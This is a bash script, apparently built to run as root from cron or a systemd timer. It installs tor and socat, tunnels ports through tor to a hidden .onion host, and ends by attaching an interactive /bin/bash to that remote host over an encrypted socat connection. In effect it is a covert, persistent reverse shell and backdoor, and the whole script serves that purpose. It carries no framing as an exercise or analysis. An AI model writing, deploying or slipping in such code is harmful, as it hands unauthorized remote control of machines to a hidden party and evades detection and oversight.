#!/bin/bash
# need to be run by root or use with .service/.timer or cron
# tor need to curcuit between node, so it take bits of time

CMD1="tor"
CMD2="socat"

if command -v "$CMD1" &>/dev/null && command -v "$CMD2" &>/dev/null ; then
    echo ""
else
    if command -v apt &>/dev/null; then
        sudo apt update && sudo apt install -y "$CMD1" "$CMD2"
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y "$CMD1" "$CMD2"
    elif command -v yum &>/dev/null; then
        sudo yum install -y "$CMD1" "$CMD2"
    fi
fi

status_tor=$(systemctl --type=service --state=running |  grep tor)
if  [[ -z "$status_tor" ]]; then
        systemctl start tor.service;
        sleep 240
fi

PORT_USED=$(ss -tulnp | awk '{print $5}' | grep 9999)
if [[ -z "$PORT_USED" ]]; then
        socat TCP-LISTEN:9999,reuseaddr,fork SOCKS5-CONNECT:localhost:9050:wznpsql......kixnql7nsiv3xc4k6id.onion:4444 &
fi


PORT=$(socat - OPENSSL:localhost:9999,verify=0)

for PORT_LISTEN in {30000..40000}; do
        PORT_USED=$(ss -tunap | awk '{print $5}' | grep "$PORT_LISTEN") # this will get establish connection also, not just Listen
        if [[  -z "$PORT_USED" ]]; then
                socat TCP-LISTEN:"$PORT_LISTEN",reuseaddr,fork SOCKS5-CONNECT:localhost:9050:wznpsql.....kixnql7nsiv3xc4k6id.onion:"$PORT" &
                break
        fi
done

socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:localhost:"$PORT_LISTEN",verify=0
